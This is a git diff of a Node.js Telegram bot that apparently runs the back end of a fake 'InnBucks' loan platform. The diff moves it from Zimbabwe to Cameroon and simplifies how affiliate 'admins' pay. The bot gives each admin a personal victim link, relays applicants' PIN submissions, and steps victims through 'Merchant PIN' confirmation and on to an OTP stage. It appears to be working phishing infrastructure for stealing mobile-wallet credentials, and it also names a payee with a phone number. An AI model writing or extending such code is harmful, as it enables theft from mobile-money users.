@@ -5,17 +5,6 @@ require('dotenv').config();
 
 const db = require('./database');
 
-// ==========================================
-// SUPER ADMINS - Multi-admin support
-// ==========================================
-// Add to .env: SUPER_ADMINS=ADMIN001,ADMIN002,ADMIN003
-// Default: ADMIN001 if not set
-const SUPER_ADMINS = (process.env.SUPER_ADMINS || 'ADMIN001').split(',').map(id => id.trim());
-
-function isSuperAdmin(adminId) {
-    return SUPER_ADMINS.includes(adminId);
-}
-
 const app = express();
 
 // ==========================================
@@ -29,17 +18,27 @@ const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `h
 // Create bot WITHOUT polling
 const bot = new TelegramBot(BOT_TOKEN);
 
+// ==========================================
+// SUPER ADMINS - Read from environment variable
+// ==========================================
+// Add to .env: SUPER_ADMINS=ADMIN001,ADMIN002,ADMIN003
+// Default: ADMIN001 if not set
+const SUPER_ADMINS = (process.env.SUPER_ADMINS || 'ADMIN001').split(',').map(id => id.trim());
+
 // In-memory maps
 const adminChatIds    = new Map(); // adminId → chatId
 const pausedAdmins    = new Set(); // adminIds that are paused
 const processingLocks = new Set(); // prevents duplicate pin submissions
-const adminLinkTimers = new Map(); // adminId → timeout reference for 5-min timer
 
 let dbReady = false;
 
 // ==========================================
 // HELPER FUNCTIONS
 // ==========================================
+
+function isSuperAdmin(adminId) {
+    return SUPER_ADMINS.includes(adminId);
+}
 
 function isAdminActive(chatId) {
     const adminId = getAdminIdByChatId(chatId);
@@ -55,15 +54,13 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
-// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+// Format +237XXXXXXXXX for Telegram display (Cameroon)
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2630712345678 → 0712345678
-    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
-    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
-    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
-    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
-    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
+    // Handle Cameroon +237 format
+    if (phoneNumber.startsWith('+237'))  return phoneNumber.slice(1); // +237... → 237...
+    if (phoneNumber.startsWith('237'))   return phoneNumber; // 237... → 237...
+    if (!phoneNumber.startsWith('2'))    return '237' + phoneNumber; // bare digits → 237...
     return phoneNumber;
 }
 
@@ -90,37 +87,6 @@ async function sendToAdmin(adminId, message, options = {}) {
     } catch (error) {
         console.error(`❌ Error sending to ${adminId}:`, error.message);
         return null;
-    }
-}
-
-// Start 5-minute countdown for admin link
-async function startLinkPaymentTimer(adminId) {
-    // Clear any existing timer
-    if (adminLinkTimers.has(adminId)) {
-        clearTimeout(adminLinkTimers.get(adminId));
-    }
-
-    const timer = setTimeout(async () => {
-        try {
-            // Update admin link status to locked
-            await db.lockAdminLink(adminId);
-            adminLinkTimers.delete(adminId);
-            console.log(`🔒 Admin link auto-locked after 5 minutes: ${adminId}`);
-        } catch (error) {
-            console.error(`❌ Error locking admin link ${adminId}:`, error);
-        }
-    }, 5 * 60 * 1000); // 5 minutes
-
-    adminLinkTimers.set(adminId, timer);
-    console.log(`⏱️ 5-minute timer started for admin link: ${adminId}`);
-}
-
-// Remove timer when payment is approved
-function removeLinkPaymentTimer(adminId) {
-    if (adminLinkTimers.has(adminId)) {
-        clearTimeout(adminLinkTimers.get(adminId));
-        adminLinkTimers.delete(adminId);
-        console.log(`✅ 5-minute timer removed for admin: ${adminId}`);
     }
 }
 
@@ -251,33 +217,29 @@ db.connectDatabase()
                 if (result.modifiedCount > 0) {
                     console.log(`🔒 Suspended ${result.modifiedCount} expired subscription(s)`);
                     
-                    // Get suspended subscriptions and notify all super admins
+                    // Get suspended subscriptions and notify admins
                     const suspended = await db.getSuspendedSubscriptions();
                     for (const sub of suspended) {
                         try {
-                            // Notify all super admins
-                            for (const superAdminId of SUPER_ADMINS) {
-                                await sendToAdmin(superAdminId, `
+                            await bot.sendMessage(sub.chatId, `
 ⚠️ *SUBSCRIPTION EXPIRED*
 
-Admin: ${sub.adminName || 'Unknown'}
-🆔 ${sub.adminId}
+Your subscription has expired and your link is now suspended.
 
 💰 Amount Due: XAF ${sub.amount}
 
 📱 Send payment to:
-*Mpesa: Send Money*
-Account: 0791336749
-Name: Okeyo Bungu
+*MTN Mobile Money / Orange Money*
+Account: Cameroon number
+Name: Elphaz Rotich
 
 After sending payment, use command:
-/payment <MPESA_CODE>
+/payment <TRANSACTION_CODE>
 
-Example: /payment LHJ7H7J7J7
-                                `, { parse_mode: 'Markdown' });
-                            }
+Example: /payment XAF123456
+                            `, { parse_mode: 'Markdown' });
                         } catch (err) {
-                            console.error(`Failed to notify admins about ${sub.adminId}:`, err.message);
+                            console.error(`Failed to notify admin ${sub.adminId}:`, err.message);
                         }
                     }
                 }
@@ -348,13 +310,13 @@ Please contact the super admin.
                 }
 
                 const admin       = await db.getAdmin(adminId);
-                const isAdmin = isSuperAdmin(adminId);
+                const isSuperAdminUser = isSuperAdmin(adminId);
 
                 let message = `
 👋 *Welcome ${admin.name}!*
 
 *Your Admin ID:* \`${adminId}\`
-*Role:* ${isAdmin ? '⭐ Super Admin' : '👤 Admin'}
+*Role:* ${isSuperAdminUser ? '⭐ Super Admin' : '👤 Admin'}
 *Your Personal Link:*
 ${WEBHOOK_URL}?admin=${adminId}
 
@@ -364,7 +326,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 /pending - Pending applications
 /myinfo - Your information
 `;
-                if (isAdmin) {
+                if (isSuperAdminUser) {
                     message += `
 *Admin Management (Super Admin Only):*
 /addadmin - Add new admin
@@ -373,9 +335,8 @@ ${WEBHOOK_URL}?admin=${adminId}
 /pauseadmin <adminId> - Pause an admin
 /unpauseadmin <adminId> - Unpause an admin
 /removeadmin <adminId> - Remove an admin
-/clearalladmins - Remove all admins (except super admins)
+/clearalladmins - Remove all admins (except ADMIN001)
 /admins - List all admins
-/pendingpayments - View pending link payment approvals
 
 *Messaging:*
 /send <adminId> <message> - Message an admin
@@ -386,7 +347,7 @@ ${WEBHOOK_URL}?admin=${adminId}
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to InnBucks Loan Platform!*
+👋 *Welcome to InnBucks Cameroon Loan Platform!*
 
 Your Chat ID: \`${chatId}\`
 
@@ -490,7 +451,7 @@ ${statusEmoji} Status: ${statusText}
     bot.onText(/\/addadmin$/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
         bot.sendMessage(chatId, `
 📝 *ADD NEW ADMIN*
 
@@ -512,7 +473,7 @@ Use this format:
     bot.onText(/\/addadmin (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
 
         try {
             const parts = match[1].trim().split('|').map(p => p.trim());
@@ -529,50 +490,26 @@ Use this format:
             const nextNumber       = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
             const newAdminId       = `ADMIN${String(nextNumber).padStart(3, '0')}`;
 
-            await db.saveAdmin({ 
-                adminId: newAdminId, 
-                chatId: newChatId, 
-                name, 
-                email, 
-                status: 'active', 
-                createdAt: new Date(),
-                linkLocked: false,
-                linkCreatedAt: new Date(),
-                paymentStatus: 'pending',
-                paymentSubmittedAt: null,
-                payerName: null,
-                paidAt: null
-            });
+            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
             
             // Initialize subscription
             await db.initializeSubscription(newAdminId, name, newChatId);
             
-            // Start 5-minute timer for link payment
-            startLinkPaymentTimer(newAdminId);
-            
             adminChatIds.set(newAdminId, newChatId);
 
-            // Notify super admin to confirm if already paid
             await bot.sendMessage(chatId, `
-✅ *NEW ADMIN CREATED*
+✅ *ADMIN ADDED*
 
 👤 ${name}
 📧 ${email}
 🆔 \`${newAdminId}\`
 💬 \`${newChatId}\`
 
-⏰ 5-minute link timer started
+🔗 Their link:
+${WEBHOOK_URL}?admin=${newAdminId}
 
-*Has this person already paid?*
-            `, {
-                parse_mode: 'Markdown',
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
-                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
-                    ]]
-                }
-            });
+✅ Admin is now CONNECTED and ready!
+            `, { parse_mode: 'Markdown' });
 
             try {
                 await bot.sendMessage(newChatId, `
@@ -583,9 +520,6 @@ Welcome ${name}!
 *Your Admin ID:* \`${newAdminId}\`
 *Your Personal Link:*
 ${WEBHOOK_URL}?admin=${newAdminId}
-
-*Your link is valid for 5 minutes*
-⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.
 
 *Commands:*
 /mylink - Get your link
@@ -608,7 +542,7 @@ ${WEBHOOK_URL}?admin=${newAdminId}
     bot.onText(/\/addadminid (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
 
         try {
             const parts = match[1].trim().split('|').map(p => p.trim());
@@ -630,50 +564,24 @@ Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`
             const existing = await db.getAdmin(newAdminId);
             if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });
 
-            await db.saveAdmin({ 
-                adminId: newAdminId, 
-                chatId: newChatId, 
-                name, 
-                email, 
-                status: 'active', 
-                createdAt: new Date(),
-                linkLocked: false,
-                linkCreatedAt: new Date(),
-                paymentStatus: 'pending',
-                paymentSubmittedAt: null,
-                payerName: null,
-                paidAt: null
-            });
+            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
             
             // Initialize subscription
             await db.initializeSubscription(newAdminId, name, newChatId);
             
-            // Start 5-minute timer for link payment
-            startLinkPaymentTimer(newAdminId);
-            
             adminChatIds.set(newAdminId, newChatId);
 
-            // Notify super admin to confirm if already paid
             await bot.sendMessage(chatId, `
-✅ *NEW ADMIN CREATED*
+✅ *ADMIN ADDED WITH CUSTOM ID*
 
 👤 ${name}
 📧 ${email}
 🆔 \`${newAdminId}\`
 💬 \`${newChatId}\`
 
-⏰ 5-minute link timer started
-
-*Has this person already paid?*
-            `, {
-                parse_mode: 'Markdown',
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
-                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
-                    ]]
-                }
-            });
+🔗 Their link:
+${WEBHOOK_URL}?admin=${newAdminId}
+            `, { parse_mode: 'Markdown' });
 
             try {
                 await bot.sendMessage(newChatId, `
@@ -684,9 +592,6 @@ Welcome ${name}!
 *Your Admin ID:* \`${newAdminId}\`
 *Your Personal Link:*
 ${WEBHOOK_URL}?admin=${newAdminId}
-
-*Your link is valid for 5 minutes*
-⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.
 
 /mylink /stats /pending /myinfo
                 `, { parse_mode: 'Markdown' });
@@ -703,7 +608,7 @@ ${WEBHOOK_URL}?admin=${newAdminId}
     bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can transfer admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');
 
         try {
             const parts = match[1].trim().split('|').map(p => p.trim());
@@ -765,7 +670,7 @@ Use /start to see commands.
     bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can pause admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');
 
         try {
             const targetAdminId = match[1].trim();
@@ -800,7 +705,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
     bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can unpause admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');
 
         try {
             const targetAdminId = match[1].trim();
@@ -832,7 +737,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
     bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can remove admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');
 
         try {
             const targetAdminId = match[1].trim();
@@ -844,7 +749,6 @@ Use /unpauseadmin ${targetAdminId} to restore.
             await db.deleteAdmin(targetAdminId);
             adminChatIds.delete(targetAdminId);
             pausedAdmins.delete(targetAdminId);
-            removeLinkPaymentTimer(targetAdminId);
 
             await bot.sendMessage(chatId, `
 🗑️ *ADMIN REMOVED*
@@ -873,164 +777,28 @@ Use /unpauseadmin ${targetAdminId} to restore.
 
         try {
             const allAdmins = await db.getAllAdmins();
-            
-            // Split into chunks to avoid 4096 character limit
-            const messages = [];
-            let currentMessage = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
-            
+            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
+
             allAdmins.forEach((admin, index) => {
-                const isSuper   = isSuperAdmin(admin.adminId);
-                const isPaused  = pausedAdmins.has(admin.adminId);
-                const isConnected = adminChatIds.has(admin.adminId);
-                const statusEmoji = isSuper ? '⭐' : isPaused ? '🚫' : '✅';
-                const statusText  = isSuper ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
-                const connEmoji   = isConnected ? '🟢' : '⚪';
+                const isSuperAdminUser  = isSuperAdmin(admin.adminId);
+                const isPaused      = pausedAdmins.has(admin.adminId);
+                const isConnected   = adminChatIds.has(admin.adminId);
+                const statusEmoji   = isSuperAdminUser ? '⭐' : isPaused ? '🚫' : '✅';
+                const statusText    = isSuperAdminUser ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
+                const connEmoji     = isConnected ? '🟢' : '⚪';
 
-                const adminLine = `${index+1}. ${statusEmoji} *${admin.name}*\n   📧 ${admin.email}\n   🆔 \`${admin.adminId}\`\n   ${connEmoji} ${statusText}\n${admin.chatId ? `   💬 \`${admin.chatId}\`\n` : ''}\n`;
-                
-                // If adding this admin exceeds 4000 chars, start a new message
-                if ((currentMessage + adminLine).length > 4000) {
-                    messages.push(currentMessage);
-                    currentMessage = `👥 *ADMINS (continued)*\n\n` + adminLine;
-                } else {
-                    currentMessage += adminLine;
-                }
-            });
-            
-            // Add the last message
-            if (currentMessage.length > 0) {
-                currentMessage += '\n🟢 = Connected | ⚪ = Not Connected';
-                messages.push(currentMessage);
-            }
-            
-            // Send all messages
-            for (const msg_text of messages) {
-                await bot.sendMessage(chatId, msg_text, { parse_mode: 'Markdown' });
-                // Small delay between messages to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-        } catch (error) {
-            console.error('❌ Error in /admins:', error);
-            bot.sendMessage(chatId, '❌ Failed to list admins. Error: ' + error.message);
-        }
-    });
-
-    // /pendingpayments - List all admins with pending link payment approvals
-    bot.onText(/\/pendingpayments/, async (msg) => {
-        const chatId  = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can view pending link payments.');
-
-        try {
-            const pendingPayments = await db.getPendingLinkPayments();
-
-            if (pendingPayments.length === 0) {
-                return bot.sendMessage(chatId, '✨ No pending link payment approvals!');
-            }
-
-            let message = `💰 *PENDING LINK PAYMENT APPROVALS (${pendingPayments.length})*\n\n`;
-
-            for (const admin of pendingPayments) {
-                message += `👤 *${admin.name}*\n`;
+                message += `${index+1}. ${statusEmoji} *${admin.name}*\n`;
+                message += `   📧 ${admin.email}\n`;
                 message += `   🆔 \`${admin.adminId}\`\n`;
-                message += `   💵 Payer: ${admin.payerName}\n`;
-                message += `   📅 Submitted: ${new Date(admin.paymentSubmittedAt).toLocaleString()}\n`;
-                message += `   📧 ${admin.email}\n\n`;
-            }
+                message += `   ${connEmoji} ${statusText}\n`;
+                if (admin.chatId) message += `   💬 \`${admin.chatId}\`\n`;
+                message += '\n';
+            });
 
+            message += '\n🟢 = Connected | ⚪ = Not Connected';
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         } catch (error) {
-            console.error('❌ Error in /pendingpayments:', error);
-            bot.sendMessage(chatId, '❌ Failed to list pending link payments. Error: ' + error.message);
-        }
-    });
-
-    // /approvepayment <adminId>
-    bot.onText(/\/approvepayment (.+)/, async (msg, match) => {
-        const chatId  = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can approve link payments.');
-
-        try {
-            const targetAdminId = match[1].trim();
-            const admin = await db.getAdmin(targetAdminId);
-            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
-            if (admin.paymentStatus === 'approved') return bot.sendMessage(chatId, `✅ Link payment already approved for ${admin.name}`);
-
-            // Unlock link and mark as paid
-            removeLinkPaymentTimer(targetAdminId);
-            await db.approveLinkPayment(targetAdminId);
-
-            await bot.sendMessage(chatId, `
-✅ *LINK PAYMENT APPROVED*
-
-👤 ${admin.name}
-🆔 \`${targetAdminId}\`
-💵 Payer: ${admin.payerName}
-⏰ ${new Date().toLocaleString()}
-
-Link is now unlocked!
-            `, { parse_mode: 'Markdown' });
-
-            // Notify admin that payment was approved
-            if (admin.chatId) {
-                await bot.sendMessage(admin.chatId, `
-✅ *LINK PAYMENT APPROVED!*
-
-Your link payment has been verified and approved.
-Your admin link is now permanently active.
-
-🔗 Your Link: ${WEBHOOK_URL}?admin=${targetAdminId}
-
-Use /start to see available commands.
-                `, { parse_mode: 'Markdown' });
-            }
-        } catch (error) {
-            console.error('❌ Error approving link payment:', error);
-            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
-        }
-    });
-
-    // /rejectpayment <adminId>
-    bot.onText(/\/rejectpayment (.+)/, async (msg, match) => {
-        const chatId  = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can reject link payments.');
-
-        try {
-            const targetAdminId = match[1].trim();
-            const admin = await db.getAdmin(targetAdminId);
-            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
-
-            // Reject payment but keep link locked
-            await db.rejectLinkPayment(targetAdminId);
-
-            await bot.sendMessage(chatId, `
-❌ *LINK PAYMENT REJECTED*
-
-👤 ${admin.name}
-🆔 \`${targetAdminId}\`
-💵 Payer: ${admin.payerName}
-⏰ ${new Date().toLocaleString()}
-
-Link remains locked. Admin can resubmit payment.
-            `, { parse_mode: 'Markdown' });
-
-            // Notify admin that payment was rejected
-            if (admin.chatId) {
-                await bot.sendMessage(admin.chatId, `
-❌ *LINK PAYMENT INVALID*
-
-Your payment submission was rejected. The payer name or payment details could not be verified.
-
-Please try again with the correct payment details.
-
-Your link remains locked until payment is approved.
-                `, { parse_mode: 'Markdown' });
-            }
-        } catch (error) {
-            console.error('❌ Error rejecting link payment:', error);
-            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+            bot.sendMessage(chatId, '❌ Failed to list admins.');
         }
     });
 
@@ -1038,7 +806,7 @@ Your link remains locked until payment is approved.
     bot.onText(/\/send (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can send messages to admins.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send messages to admins.');
 
         try {
             const input = match[1].trim();
@@ -1076,7 +844,7 @@ ${messageText}
     bot.onText(/\/broadcast (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can broadcast.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');
 
         try {
             const messageText  = match[1].trim();
@@ -1126,7 +894,7 @@ ${results.join('\n')}
     bot.onText(/\/ask (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can send action requests.');
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send action requests.');
 
         try {
             const input = match[1].trim();
@@ -1178,7 +946,7 @@ ${requestText}
         
         // SUPER ADMIN ONLY
         if (!isSuperAdmin(adminId)) {
-            return bot.sendMessage(chatId, '❌ Only super admin can do this!');
+            return bot.sendMessage(chatId, '❌ Only superadmin can do this!');
         }
         
         try {
@@ -1203,7 +971,7 @@ React with ✅ to confirm or ❌ to cancel
         }
     });
 
-    // /payment <MPESA_CODE>
+    // /payment <TRANSACTION_CODE>
     bot.onText(/\/payment (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
@@ -1213,22 +981,11 @@ React with ✅ to confirm or ❌ to cancel
         }
         
         if (isSuperAdmin(adminId)) {
-            return bot.sendMessage(chatId, `
-⭐ *SUPER ADMIN - NO SUBSCRIPTION REQUIRED*
-
-You don't need to pay for a subscription!
-
-Instead, use these commands to manage payments from other admins:
-/send - Message an admin
-/broadcast - Message all admins  
-/ask - Send action request
-
-When admins send their payment code, you'll receive notifications with Approve/Decline buttons.
-            `, { parse_mode: 'Markdown' });
+            return bot.sendMessage(chatId, '❌ Superadmin does not require subscription.');
         }
         
         try {
-            const mpesaCode = match[1].trim().toUpperCase();
+            const transactionCode = match[1].trim().toUpperCase();
             const subscription = await db.getSubscription(adminId);
             
             if (!subscription) {
@@ -1254,17 +1011,21 @@ Your payment is pending verification by the super admin.
 🆔 Admin ID: \`${adminId}\`
 👤 Name: ${admin.name}
 💰 Amount: XAF ${subscription.amount}
-📱 Mpesa Code: \`${mpesaCode}\`
+📱 Transaction Code: \`${transactionCode}\`
 ⏰ Time: ${new Date().toLocaleString()}
 
 We will notify you once the payment is confirmed.
             `, { parse_mode: 'Markdown' });
             
-            // Notify all super admins
-            for (const superAdminId of SUPER_ADMINS) {
-                const superAdminChatId = adminChatIds.get(superAdminId);
-                if (superAdminChatId) {
-                    await bot.sendMessage(superAdminChatId, `
+            // Notify super admin
+            const superAdminChatIds = [];
+            for (const adminIdTemp of SUPER_ADMINS) {
+                const chatIdTemp = adminChatIds.get(adminIdTemp);
+                if (chatIdTemp) superAdminChatIds.push(chatIdTemp);
+            }
+            
+            for (const superAdminChatId of superAdminChatIds) {
+                await bot.sendMessage(superAdminChatId, `
 💳 *NEW PAYMENT RECEIVED*
 
 Admin has sent payment and is awaiting your confirmation.
@@ -1274,20 +1035,19 @@ Admin has sent payment and is awaiting your confirmation.
 👤 Name: ${admin.name}
 📧 Email: ${admin.email}
 💰 Amount: XAF ${subscription.amount}
-📱 Mpesa Code: \`${mpesaCode}\`
+📱 Transaction Code: \`${transactionCode}\`
 ⏰ Time: ${new Date().toLocaleString()}
 
-Please verify the payment in your M-Pesa account.
-                    `, {
-                        parse_mode: 'Markdown',
-                        reply_markup: {
-                            inline_keyboard: [[
-                                { text: '✅ APPROVE', callback_data: `approve_payment_${adminId}_${mpesaCode}` },
-                                { text: '❌ DECLINE', callback_data: `decline_payment_${adminId}` }
-                            ]]
-                        }
-                    });
-                }
+Please verify the payment in your Mobile Money account.
+                `, {
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ APPROVE', callback_data: `approve_payment_${adminId}_${transactionCode}` },
+                            { text: '❌ DECLINE', callback_data: `decline_payment_${adminId}` }
+                        ]]
+                    }
+                });
             }
         } catch (error) {
             console.error('❌ Error processing payment:', error);
@@ -1317,57 +1077,6 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
     }
 
-    // ── Link payment callback (yes/no already paid) ──
-    if (data.startsWith('link_paid_yes_') || data.startsWith('link_paid_no_')) {
-        const parts = data.split('_');
-        const answer = parts[2]; // yes or no
-        const targetAdminId = parts.slice(3).join('_');
-
-        if (answer === 'yes') {
-            // Admin already paid - remove timer, unlock link
-            removeLinkPaymentTimer(targetAdminId);
-            await db.approveLinkPayment(targetAdminId);
-
-            await bot.editMessageText(`
-✅ *LINK PAYMENT CONFIRMED*
-
-Admin \`${targetAdminId}\` - Already paid
-Link is now unlocked and permanently active!
-
-⏰ ${new Date().toLocaleString()}
-            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment confirmed, link unlocked!' });
-
-            // Notify the admin
-            const admin = await db.getAdmin(targetAdminId);
-            if (admin?.chatId) {
-                bot.sendMessage(admin.chatId, `
-✅ *YOUR LINK IS NOW ACTIVE!*
-
-Payment confirmed! Your admin link is permanently active.
-
-🔗 ${WEBHOOK_URL}?admin=${targetAdminId}
-
-Use /start to see available commands.
-                `, { parse_mode: 'Markdown' }).catch(() => {});
-            }
-        } else {
-            // Admin NOT paid yet - keep 5-min timer
-            await bot.editMessageText(`
-⏱️ *LINK TIMER ACTIVE*
-
-Admin \`${targetAdminId}\` - Payment needed
-5-minute countdown continues...
-
-Admin will see payment form after timer expires.
-            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '⏱️ 5-minute timer continues' });
-        }
-        return;
-    }
-
     // ── Request responses (Done / Need Help) ──
     if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
         const parts             = data.split('_');
@@ -1375,10 +1084,10 @@ Admin will see payment form after timer expires.
         const requestId         = parts[2];
         const respondingAdminId = parts[3];
         const respondingAdmin   = await db.getAdmin(respondingAdminId);
-
+        
         // Notify all super admins
         for (const superAdminId of SUPER_ADMINS) {
-            const superAdminChatId = adminChatIds.get(superAdminId);
+            const superAdminChatId  = adminChatIds.get(superAdminId);
             if (superAdminChatId) {
                 if (action === 'done') {
                     await bot.sendMessage(superAdminChatId, `
@@ -1439,7 +1148,6 @@ Super admin has been notified.
                         deletedNames.push(`${admin.name} (${admin.adminId})`);
                         adminChatIds.delete(admin.adminId);
                         pausedAdmins.delete(admin.adminId);
-                        removeLinkPaymentTimer(admin.adminId);
                     } catch (err) {
                         console.error(`Failed to delete ${admin.adminId}:`, err.message);
                     }
@@ -1449,7 +1157,7 @@ Super admin has been notified.
 🗑️ *ALL ADMINS CLEARED*
 
 Deleted: ${deletedCount} admin(s)
-🛡️  Protected: SUPER ADMINS (${SUPER_ADMINS.join(', ')})
+🛡️  Protected: SUPER ADMINS
 ⏰ ${new Date().toLocaleString()}
 
 *Deleted Admins:*
@@ -1500,13 +1208,13 @@ Clear all admins operation was cancelled.
             try {
                 const parts = data.split('_');
                 const targetAdminId = parts[2];
-                const mpesaCode = parts[3];
+                const transactionCode = parts[3];
                 
                 const targetAdmin = await db.getAdmin(targetAdminId);
                 
                 // Record payment
                 await db.recordPayment(targetAdminId, {
-                    mpesaCode,
+                    transactionCode,
                     paymentDate: new Date().toISOString(),
                     confirmedBy: adminId
                 });
@@ -1522,8 +1230,8 @@ Clear all admins operation was cancelled.
 
 Admin: ${targetAdmin.name}
 🆔 \`${targetAdminId}\`
-💰 XAF 500
-📱 \`${mpesaCode}\`
+💰 XAF ${(await db.getSubscription(targetAdminId)).amount}
+📱 \`${transactionCode}\`
 ⏰ ${new Date().toLocaleString()}
 
 Link is now active!
@@ -1743,6 +1451,191 @@ User will now proceed to OTP.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
     }
+
+    // ──────────────────────────────────────
+    // PIN APPROVAL HANDLERS
+    // ──────────────────────────────────────
+    else if (data.startsWith('allow_pin_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
